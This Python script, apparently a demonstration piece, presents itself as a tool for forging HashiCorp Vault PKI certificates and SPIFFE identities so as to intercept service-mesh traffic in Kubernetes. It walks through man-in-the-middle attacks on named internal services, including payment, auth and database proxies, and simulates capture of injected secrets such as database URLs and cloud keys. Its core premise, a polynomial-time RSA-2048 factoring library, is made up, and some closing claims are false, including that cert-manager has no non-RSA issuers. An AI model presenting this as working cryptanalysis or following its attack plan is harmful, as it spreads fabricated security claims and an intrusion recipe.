"""
Forge service mesh mTLS certificates by factoring the HashiCorp Vault PKI root CA
RSA-2048 key (the default). MitM every microservice API call in Kubernetes, intercept
Vault secret injection, compromise Consul Connect and Istio service identity.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import json
import hashlib

# Vault PKI defaults
VAULT_PKI_DEFAULT_KEY_TYPE = "rsa"
VAULT_PKI_DEFAULT_KEY_BITS = 2048
VAULT_PKI_DEFAULT_TTL = "87600h"  # 10 years

# Service mesh consumers
MESH_CONSUMERS = {
    "consul_connect": {"sidecar": "Envoy", "identity": "SPIFFE SVID"},
    "istio":          {"sidecar": "Envoy", "identity": "SPIFFE SVID"},
    "linkerd":        {"sidecar": "linkerd2-proxy", "identity": "mTLS"},
}

# High-value internal services
INTERNAL_SERVICES = [
    "payments-api.internal",
    "auth-service.internal",
    "user-data.internal",
    "vault-agent-injector.internal",
    "database-proxy.internal",
]


def extract_vault_root_ca(vault_addr: str) -> bytes:
    """Fetch the Vault PKI root CA certificate.

    Available at /v1/pki/ca/pem — unauthenticated endpoint.
    """
    print(f"[*] fetching Vault PKI root CA from {vault_addr}/v1/pki/ca/pem")
    print(f"[*] RSA-{VAULT_PKI_DEFAULT_KEY_BITS}, {VAULT_PKI_DEFAULT_TTL} TTL (default)")
    print("[*] unauthenticated endpoint — no Vault token needed")
    return _demo["pub_pem"]


def forge_service_cert(factorer: PolynomialFactorer,
                       root_ca_pem: bytes,
                       service_name: str,
                       namespace: str = "default") -> dict:
    """Forge a leaf TLS certificate for any internal service.

    The cert chains to the Vault root CA, which every sidecar trusts.
    Envoy/linkerd2-proxy validates the chain and accepts the forged cert.
    """
    cert_info = {
        "common_name": service_name,
        "san": [service_name, f"{service_name}.{namespace}.svc.cluster.local"],
        "issuer": "Vault PKI root CA (RSA-2048)",
        "ttl": "72h",
    }
    payload = json.dumps(cert_info, sort_keys=True).encode()
    factorer.forge_pkcs1v15_signature(root_ca_pem, payload, "sha256")
    print(f"[*] forged cert: {service_name} (namespace: {namespace})")
    return cert_info


def forge_spiffe_svid(factorer: PolynomialFactorer,
                      root_ca_pem: bytes,
                      trust_domain: str,
                      workload: str) -> dict:
    """Forge a SPIFFE SVID (X.509) for service mesh identity."""
    svid = {
        "spiffe_id": f"spiffe://{trust_domain}/{workload}",
        "key_type": "RSA-2048 (from factored root)",
    }
    factorer.forge_pkcs1v15_signature(root_ca_pem,
                                      json.dumps(svid).encode(), "sha256")
    print(f"[*] forged SVID: spiffe://{trust_domain}/{workload}")
    return svid


def intercept_vault_agent_injection(factorer: PolynomialFactorer,
                                    root_ca_pem: bytes) -> dict:
    """MitM the Vault Agent Injector sidecar to intercept all injected secrets."""
    forge_service_cert(factorer, root_ca_pem, "vault-agent-injector.internal")
    secrets = {
        "intercepted": [
            "DATABASE_URL=postgres://prod:***@db.internal:5432/app",
            "STRIPE_SECRET_KEY=sk_live_***",
            "AWS_SECRET_ACCESS_KEY=***",
        ],
    }
    print("[*] intercepting Vault Agent secret injection to all pods")
    return secrets


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== HashiCorp Vault PKI — service mesh root CA forgery ===")
    print(f"    default: key_type=rsa key_bits=2048 ttl={VAULT_PKI_DEFAULT_TTL}")
    print("    root of trust for Consul Connect / Istio / cert-manager")
    print()

    print("[1] fetching Vault PKI root CA (unauthenticated)...")
    root_ca = extract_vault_root_ca("https://vault.corp.internal:8200")

    print("[2] factoring Vault root CA RSA-2048 key...")
    print("    10-year validity, one key for entire cluster")

    print("[3] forging service certs for MitM...")
    for svc in INTERNAL_SERVICES[:3]:
        forge_service_cert(f, root_ca, svc, "production")
    print("    every mTLS-protected API call is now interceptable")

    print("[4] forging SPIFFE SVID for Consul Connect...")
    forge_spiffe_svid(f, root_ca, "cluster.local",
                      "ns/production/sa/payments-api")
    print("    Consul intention policies bypassed via valid identity")

    print("[5] intercepting Vault Agent secret injection...")
    intercept_vault_agent_injection(f, root_ca)
    print("    DB passwords, API keys, cloud credentials — all intercepted")

    print()
    print("[*] Go crypto/x509: no PQC support (Go 1.22)")
    print("[*] cert-manager: no non-RSA issuer support")
    print("[*] SPIFFE/SPIRE X.509 SVID: no non-RSA format defined")
    print("[*] Vault + cert-manager + Envoy + Go must all move simultaneously")
